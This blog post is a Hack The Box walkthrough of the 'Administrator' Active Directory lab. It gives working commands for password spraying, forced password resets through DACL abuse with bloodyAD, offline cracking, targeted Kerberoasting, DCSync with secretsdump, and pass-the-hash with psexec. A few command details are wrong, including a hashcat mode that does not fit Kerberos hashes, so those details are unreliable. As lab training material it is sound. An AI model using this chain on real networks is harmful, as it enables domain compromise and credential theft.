---
title: "Administrator"
date: 2025-06-11
excerpt: A full walkthrough of HTB’s Administrator box covering AD enumeration, DACL abuse, and domain compromise.
categories:
  - htb 
tags:
  - active-directory
  - bloodhound
  - dacl-abuse
  - smb
  - ftp
  - password-cracking
  - winrm
  - kerberoasting
  - impacket
  - hashcat
  - psexec 
  - bloodyad
  - netexec            
header:
  teaser: /assets/images/htb/administrator/admin.jpg
toc: true
---




<img src="/assets/images/htb/administrator/admin.jpg"
     alt="Alt text describing the image"
     class="align-center"      
     style="max-width: 600px;" />


# Overview

Administrator is a medium-rated Windows box on Hack The Box that focuses on Active Directory misconfigurations, specifically DACL abuse that can lead to full domain compromise. This one stood out to me because of how common AD is in real-world environments and how easily things can spiral when permissions aren't set correctly.

We’re given initial creds right away, which simulates a real scenario where you might start an internal test or land access through phishing.

> **Username:** `Olivia`  
> **Password:** `ichliebedich`

From there, the box involves using BloodHound to find privilege escalation paths, resetting user passwords, grabbing a backup from FTP, cracking it, and eventually abusing DCSync to grab domain admin hashes.

It’s a great example of how chaining small misconfigs can lead to total compromise.

---

## Full Port Scan and Initial Enumeration

Before we start with a full scan, we want to add the IP address with the box name to our /etc/hosts file.  

We can open /etc/hosts with a text editor of our choice and add `<ip> dc01.administrator.htb administrator.htb`. My choice for text editors is sublime.

```bash

subl /etc/hosts
```

![](/assets/images/htb/administrator/1host.png)

![](/assets/images/htb/administrator/2addedhost.png)

 Once we add that, save the file, and we can kick off our scan.

**Why are we doing this?**  

This speeds up the process a bit because I have completed numerous boxes on Hack The Box and have noticed a pattern on their AD machines. Typically, these are `<boxname>.htb` and `dc01.<boxname>.htb`. If we didn't do this now, we would need to add these after our scan.  

We are now initiating a full TCP port scan using aggressive timing to identify open services quickly. Since we have added the IP address with the domain name to our /etc/hosts file, we can use the box name instead of just the IP.

---

```bash

nmap -sCV -p- <ip or box name> --min-rate=1000 --min-parallelism=1000 -v
```

**Key Flags:**
- `-sC`: runs default Nmap scripts
- `-sV`: enables version detection
- `-p-`: Scans all 65535 ports
- `--min-rate=1000`: sends packets faster than the default rate.
- `--min-parallelism=1000`: sends probes in parallel for speed.

> I only use `--min-rate` and `--min-parallelism` in CTF environments to speed up discovery.

```
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-16 11:33:47Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62900/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62907/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
62912/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62915/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62935/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62968/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|2016|2012|2019|Vista|11|2008|7|8.1 (94%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10:1703 cpe:/o:microsof
```
The Nmap results show that ports 53 (DNS), 88 (Kerberos), 139 and 445 (SMB), and 389 (LDAP) are open, which is a good indicator that this is an Active Directory box.  

Another interesting port that I notice, which I don't see often on a DC, is port 21 FTP.  

The nmap scan also shows that the domain name is Administrator.htb, which is why we placed the IP and box name as administrator.htb into our `/etc/hosts`  

---

## User Credentials with FTP and SMB

We were given the credentials of Olivia:ichliebedich, and I wanted to do my due diligence by going through each port to see if we have any easy wins.  

I looked into ftp and saw that Olivia cannot log in.

```bash

ftp <ip>
# connect with Olivia
# then enter password: ichliebedich
```

![](/assets/images/htb/administrator/3ftp.png)

Next, I tried smb with the credentials that we were given from the very beginning.  

> **Note:** I am using netexec on this box, but I also tend to use smbclient or smbmap to double-check my work. For the sake of this box, I am sticking to netexec.  

```bash

nxc smb administrator.htb -u olivia -p ichliebedich --shares
```

![](/assets/images/htb/administrator/4smb.png)

We can see that we have read permissions to SYSVOL, NETLOGON, and IPC$, which are typical of what we would see on an SMB share, but there are no other shares that we could use as an easy win.  

---

## BloodHound and The BloodyAD Incoming!

So far, we haven't found any information to move forward, but that's okay because we do have credentials that can be used to enumerate internally.  

This is where BloodHound comes into play!  

Bloodhound-python is a Python-based ingestor that we can use to enumerate the Domain Controller internally and export the data to BloodHound.  

```bash

bloodhound-python -ns 10.129.129.13 -d administrator.htb -u olivia -p ichliebedich -c all --zip
```

![](/assets/images/htb/administrator/5bloodhound.png)

Once we have the zip file, we can start Bloodhound on our system, open Bloodhound locally, and ingest the zip file.

![](/assets/images/htb/administrator/6bloodhoundstart.png)

Now the fun begins! We will add `olivia@administrator.htb` to the search and click on Olivia's node, and we will make this the starting point.

![](/assets/images/htb/administrator/7bholivia.png)

The drop-down on the right-hand side comes down, and we can see the outbound object control, which shows `michael@administrator.htb`. 

![](/assets/images/htb/administrator/8bholivobc.png)

When we click on outbound object control we see that Olivia has GenericAll rights to Michael.

![](/assets/images/htb/administrator/9olivtomike.png)

We see that there are details on the right-hand side regarding how we can exploit GenericAll.  

![](/assets/images/htb/administrator/10genericall.png)

We are given examples of Windows and Linux abuse, which guide how to exploit these vulnerabilities.  

![](/assets/images/htb/administrator/11linuxgeneric.png)

I am going to take another route and use `bloodyAD` to have a variation of tools that we can use.

In order for us to change Michael's password we can run:

```bash

bloodyAD -u olivia -p ichliebedich -d administrator.htb --dc-ip 10.129.129.13  set password 'michael' 'Password123!'
```

**Key Flags:**
- `-u` and `-p` are for the credentials we have ( or, in our case, were given)
- `-d` domain name in this case administrator.htb
- `--dc-ip` IP of the target box.  

[BloodyAD Wiki](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)  

According to the BloodyAD documentation, we would use the set password command with two positional arguments: the user and the new password we are creating. I chose to have Michael's new password as `Password123!`

![](/assets/images/htb/administrator/12passchange.png)

Let's take a look further with Bloodhound now and see if there are any outbound object controls for Michael.  

Using the same tactic as before, we see that Michael can force change Ben's password. 

![](/assets/images/htb/administrator/13miketoben.png)

Now, if we click on Ben's name, we can see that in `member of`, he is listed as a share moderator. 

![](/assets/images/htb/administrator/14benshare.png)

Knowing that we are going to use Benjamin's new credentials and then log in to the ftp server.

```bash

bloodyAD -u michael -p 'Password123! -d administrator.htb --dc-ip 10.129.129.13  set password 'benjamin' 'Password123!'
```

![](/assets/images/htb/administrator/15benpass.png)

Used the same command as previously, since it was a pretty efficient way of getting password resets done.

---

## FTP Access

Now that we have reset Benjamin's account with the password `Password123!`, we are going to log in to the FTP server.

```bash

ftp 10.129.129.13
```

![](/assets/images/htb/administrator/15ftpaccess.png)

When typing `ls`, we see that there is a backup.psafe3 file.  

To transfer this file correctly, we will type `bin` to change to binary mode and then `mget Backup.psafe3`.  

```bash

ls
bin
mget Backup.psafe3
```

![](/assets/images/htb/administrator/15ftpdownload.png)

---

## Password Cracking Psafe files

Googling for `psafe3`, we find out that we need Password Safe installed in order to open the file. According to the GitHub page's Linux README.md file, we can install through apt.

```bash

sudo apt install passwordsafe
```
[Password safe Github](https://github.com/pwsafe/pwsafe/releases?q=non-windows&expanded=true)

When we open Password Safe, we are prompted to connect to the database and enter a master password. We don't have the master password as of yet, but we can use hashcat to crack the `Backup.psafe3` file.

```bash

hashcat -m 5200 Backup.psafe3 /opt/seclists/Passwords/Leaked-Database/rockyou.txt -o backup.pass
```

![](/assets/images/htb/administrator/16psafepasscrack.png)

![](/assets/images/htb/administrator/17psafepass.png)

The cracked password turned out to be `tekieromucho`  

Now, we will connect to the database and use it as the master password and login.  


We now have three additional users `Alexander Smith`, `Emily Rodriguez`, and `Emma Johnson`. When you click on a user, their password is automatically copied. At this point, I will create a password file and add all the new passwords, as well as a user file containing the current users.  

This will make it easier for us to use tools such as NetExec to identify who has access to what.  

For sanity's sake, I double-checked Bloodhound and found that every user on the network uses only their first name, making our user list more straightforward to manage.

![](/assets/images/htb/administrator/18userpass.png)


---

## Foothold

Now that we have our list, we will run NetExec and spray credentials to see who can log in with WinRM, since port 5985 is open.

```bash

netexec winrm administrator.htb -u user.txt -p pass.txt --continue-on-success | grep '[+]'
```
I use `grep '[+]'` so that I don't have to see all the failed login attempts with netexec.  

What we are left with are two users, Olivia and Emily, who can connect to the system. 

![](/assets/images/htb/administrator/19netexecfoothold.png)

Following Emily, we find the user.txt file on her desktop.

![](/assets/images/htb/administrator/20winrm.png)

![](/assets/images/htb/administrator/21userflag.png)

---

## Privilege Escalation

After gathering the flag.  

I decided to look back into Bloodhound for Emily and saw that the outbound control object was to Ethan, and Emily has GenericWrite over Ethan.  

Examining GenericWrite on Bloodhound, we should be able to use targeted Kerberoasting.

![](/assets/images/htb/administrator/22EthanAbuse.png)

Hacking articles also stated the same information.

[Hacking Articles DACL](https://www.hackingarticles.in/abusing-ad-dacl-genericwrite/)

[Github Targeted Kerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

Before we proceed, if we do not update our clocks to match those of the Domain Controller, we will encounter a clock skew error.

```bash

sudo ntpdate administrator.htb
```

We should now be able to run the following command.

```bash

python3 targetedKerberoast.py --dc-ip 10.129.129.13 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```
![](/assets/images/htb/administrator/23ethancrack.png)

Let's place the hash into its own file and use hashcat to crack it!

```bash

hashcat -m 5200 ethan.hash /opt/seclists/Passwords/Leaked-Databases/rockyou.txt -o ethan.pass
```

We were able to crack the hash and found that Ethan's password is `limpbizkit`

Back to Bloodhound, we can see that Ethan has `GetChangesAll` (DCSYNC) abilities for administrators.  

![](/assets/images/htb/administrator/24ethantoadmin.png)

The easiest way of achieving this, as shown on BloodHound, is to use `impacket-secretsdump`

```bash

impacket-secretsdump administrator.htb/ethan:'limpbizkit'@administrator.htb
```
We now have the NTLM hash of the administrator. 

![](/assets/images/htb/administrator/25impacketadmin.png)

Finally, take the back half of the hash and we will run `impacket-psexec`

```bash

impacket-psexec administrator@administrator.htb -hashes :PLACE HASH HERE
```

![](/assets/images/htb/administrator/26psexec.png)

---

## Post-Exploitation and Flag

Now that we have administrator access, we can access the administrator's desktop and retrieve our root.txt flag.

![](/assets/images/htb/administrator/27rootflag.png)

---

## Key Takeaways
- Initial credentials can go a long way — never underestimate what low-privileged users can access in Active Directory (AD) environments.
- DACL misconfigurations are dangerous — a single misconfigured user right (like GenericAll) can lead to full domain compromise.
- BloodHound is essential for mapping AD privilege escalation paths and should be part of every internal Active Directory (AD) assessment.
- Tool flexibility matters — knowing when to use netexec, bloodyAD, or targetedKerberoast speeds up enumeration and attack chaining.
- Always explore unusual services — FTP on a DC is rare; here it led to credential gold via Backup.psafe3.
- Be patient and methodical — AD boxes require chaining multiple steps. Don’t rush; understand each piece before moving.
- Update your system time when using Kerberos-based tools, or you’ll encounter avoidable issues, such as clock skew errors.


---

